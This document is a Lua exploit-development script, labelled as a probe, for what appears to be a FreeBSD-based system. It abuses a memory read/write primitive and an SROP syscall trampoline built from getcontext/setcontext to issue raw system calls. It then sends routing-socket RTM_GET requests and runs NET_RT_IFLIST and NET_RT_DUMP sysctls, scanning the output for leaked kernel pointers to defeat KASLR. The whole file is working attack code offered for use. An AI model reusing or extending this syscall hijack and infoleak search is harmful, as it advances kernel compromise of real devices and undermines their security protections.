-- CRASH_CLASS: LOW
-- PROBE 167a: Kernel stack residue via RTM_GET response comparison
--
-- RTM_GET response is 200 bytes with rt_msghdr (0x90) + rt_metrics (0x68)
-- + sockaddrs. Some padding/unused fields may contain uninitialized
-- kernel stack data that varies between calls.
--
-- Strategy: send 10 identical RTM_GET requests, dump all bytes
-- of each response, and compare to find variable bytes.
-- Also try NET_RT_IFLIST via sysctl for kernel pointer leaks.

print("=== PROBE 167a: RTSOCK RESIDUE KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x800000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function pack4(b0, b1, b2, b3)
    return b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
end

local HDR_LEN = 0x90

local rtfd = srop(97, uint64(17), uint64(3), uint64(0))
local rtfdv = rtfd and to_num(rtfd) or -1
print("rt_socket=" .. rtfdv)
if rtfdv < 0 then print("=== DONE ==="); return end

-- All offsets are relative to gpu base
local MSG_OFF = 0x50000

local function do_rtm_get(dest_bytes, seq, resp_off)
    for off = 0, 0x1FF, 4 do wd(gpu + MSG_OFF + off, 0) end
    wd(gpu + MSG_OFF, pack4(0xA0, 0, 5, 4))
    wd(gpu + MSG_OFF + 0x0C, 1)
    wd(gpu + MSG_OFF + 0x14, seq)
    local DST = MSG_OFF + HDR_LEN
    wd(gpu + DST, pack4(16, 2, 0, 0))
    wd(gpu + DST + 4, pack4(dest_bytes[1], dest_bytes[2],
        dest_bytes[3], dest_bytes[4]))

    local wr = srop(4, uint64(rtfdv), ga(MSG_OFF), uint64(160))
    if wr == nil then return nil end

    for off = 0, 0x1FF, 4 do wd(gpu + resp_off + off, 0) end
    local rr = srop(3, uint64(rtfdv), ga(resp_off), uint64(0x200))
    if rr == nil then return nil end
    return to_num(rr)
end

-- [A] Collect 10 responses for 127.0.0.1
print("--- [A] COLLECT 10 RESPONSES ---")
local RESP_BASE = 0x100000
local num_resp = 10
local resp_sizes = {}

for i = 1, num_resp do
    local off = RESP_BASE + (i - 1) * 0x200
    local sz = do_rtm_get({127, 0, 0, 1}, i, off)
    resp_sizes[i] = sz or 0
    if i == 1 then print("resp[1] size=" .. (sz or 0)) end
end

-- Compare all responses dword by dword
print("")
print("--- [B] COMPARE RESPONSES ---")
local varying_offsets = {}

if resp_sizes[1] and resp_sizes[1] > 0 then
    local sz = resp_sizes[1]
    for off = 0, sz - 4, 4 do
        local ref = rd(gpu + RESP_BASE + off)
        local varies = false
        for i = 2, num_resp do
            local val = rd(gpu + RESP_BASE + (i - 1) * 0x200 + off)
            if val ~= ref then
                varies = true
                break
            end
        end
        if varies then
            table.insert(varying_offsets, off)
        end
    end

    print("total_response_bytes=" .. sz)
    print("varying_dword_offsets: " .. #varying_offsets)

    for _, off in ipairs(varying_offsets) do
        local vals = {}
        for i = 1, math.min(5, num_resp) do
            local v = rd(gpu + RESP_BASE + (i - 1) * 0x200 + off)
            table.insert(vals, string.format("%08X", v))
        end
        local label = ""
        if off == 0x14 then label = " (rtm_seq)"
        elseif off >= 0x28 and off < 0x90 then label = " (rt_metrics)"
        end
        print("  +" .. string.format("%02X", off) .. ": " ..
            table.concat(vals, " ") .. label)
    end

    -- Check qwords for kernel pointers
    print("")
    print("--- [C] KERNEL POINTER SCAN ---")
    local kptr_found = false
    for i = 1, num_resp do
        for off = 0, sz - 8, 8 do
            local val = rq(gpu + RESP_BASE + (i - 1) * 0x200 + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  resp[" .. i .. "] +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
                kptr_found = true
            end
        end
    end
    if not kptr_found then print("  no kernel pointers found") end

    -- Dump non-zero rt_metrics
    print("")
    print("--- [D] RT_METRICS DUMP ---")
    for off = 0x28, 0x8C, 8 do
        local val = rq(gpu + RESP_BASE + off)
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then
            print("  +" .. string.format("%02X", off) ..
                "=0x" .. string.format("%X%08X", vh, vl))
        end
    end
end

-- [E] Different destinations
print("")
print("--- [E] DIFFERENT DESTINATIONS ---")
local dests = {
    {0, 0, 0, 0, "0.0.0.0"},
    {10, 0, 0, 1, "10.0.0.1"},
    {10, 0, 0, 96, "10.0.0.96"},
    {192, 168, 1, 1, "192.168.1.1"},
    {8, 8, 8, 8, "8.8.8.8"},
    {255, 255, 255, 255, "255.255.255.255"},
}

local DEST_RESP = 0x200000
for _, d in ipairs(dests) do
    local sz = do_rtm_get({d[1], d[2], d[3], d[4]}, 100, DEST_RESP)
    if sz and sz > 0 then
        local errno = rd(gpu + DEST_RESP + 0x18)
        local addrs = rd(gpu + DEST_RESP + 0x0C)
        local kp = 0
        for qoff = 0, sz - 8, 8 do
            local val = rq(gpu + DEST_RESP + qoff)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then kp = kp + 1 end
        end
        print(d[5] .. ": sz=" .. sz .. " errno=" .. errno ..
            " addrs=0x" .. string.format("%X", addrs) .. " kptrs=" .. kp)
    else
        print(d[5] .. ": failed")
    end
end

-- [F] NET_RT_IFLIST via sysctl — check for kernel pointers in interface list
print("")
print("--- [F] NET_RT_IFLIST SYSCTL ---")
local MIB_OFF = 0x300000
local OUTBUF_OFF = 0x310000
local LENP_OFF = 0x30F000

wd(gpu + MIB_OFF, 4)       -- CTL_NET
wd(gpu + MIB_OFF + 4, 17)  -- AF_ROUTE
wd(gpu + MIB_OFF + 8, 0)   -- protocol
wd(gpu + MIB_OFF + 12, 0)  -- family
wd(gpu + MIB_OFF + 16, 3)  -- NET_RT_IFLIST
wd(gpu + MIB_OFF + 20, 0)  -- flags

wd(gpu + LENP_OFF, 0x40000)
wd(gpu + LENP_OFF + 4, 0)

local rv = srop(202, ga(MIB_OFF), uint64(6), ga(OUTBUF_OFF),
    ga(LENP_OFF), uint64(0), uint64(0))
local rvv = rv and to_num(rv) or -999
local actual_len = rd(gpu + LENP_OFF)
print("sysctl(NET_RT_IFLIST)=" .. rvv .. " len=" .. actual_len)

if rvv == 0 and actual_len > 0 then
    local kp = 0
    local scan_len = math.min(actual_len, 0x8000)
    for off = 0, scan_len - 8, 8 do
        local val = rq(gpu + OUTBUF_OFF + off)
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            kp = kp + 1
            if kp <= 10 then
                print("  IFLIST KPTR +" .. string.format("%04X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end
    print("iflist_kptrs=" .. kp)
    if kp > 0 then
        print("*** KERNEL POINTERS IN NET_RT_IFLIST! ***")
        print("*** POSSIBLE KASLR DEFEAT! ***")
    end

    -- Also dump first 256 bytes to see structure
    print("iflist first 128 bytes:")
    for off = 0, 120, 8 do
        local val = rq(gpu + OUTBUF_OFF + off)
        local vh, vl = get_hi_lo(val)
        print("  +" .. string.format("%02X", off) ..
            "=0x" .. string.format("%X%08X", vh, vl))
    end
end

-- [G] NET_RT_DUMP — full routing table dump
print("")
print("--- [G] NET_RT_DUMP ---")
wd(gpu + MIB_OFF, 4)       -- CTL_NET
wd(gpu + MIB_OFF + 4, 17)  -- AF_ROUTE
wd(gpu + MIB_OFF + 8, 0)   -- protocol
wd(gpu + MIB_OFF + 12, 0)  -- family
wd(gpu + MIB_OFF + 16, 1)  -- NET_RT_DUMP
wd(gpu + MIB_OFF + 20, 0)  -- flags

local DUMP_OFF = 0x400000
local DLENP_OFF = 0x3FF000
wd(gpu + DLENP_OFF, 0x40000)
wd(gpu + DLENP_OFF + 4, 0)

rv = srop(202, ga(MIB_OFF), uint64(6), ga(DUMP_OFF),
    ga(DLENP_OFF), uint64(0), uint64(0))
rvv = rv and to_num(rv) or -999
local dump_len = rd(gpu + DLENP_OFF)
print("sysctl(NET_RT_DUMP)=" .. rvv .. " len=" .. dump_len)

if rvv == 0 and dump_len > 0 then
    local kp = 0
    local scan_len = math.min(dump_len, 0x8000)
    for off = 0, scan_len - 8, 8 do
        local val = rq(gpu + DUMP_OFF + off)
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            kp = kp + 1
            if kp <= 10 then
                print("  DUMP KPTR +" .. string.format("%04X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end
    print("dump_kptrs=" .. kp)
end

srop(6, uint64(rtfdv))
print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
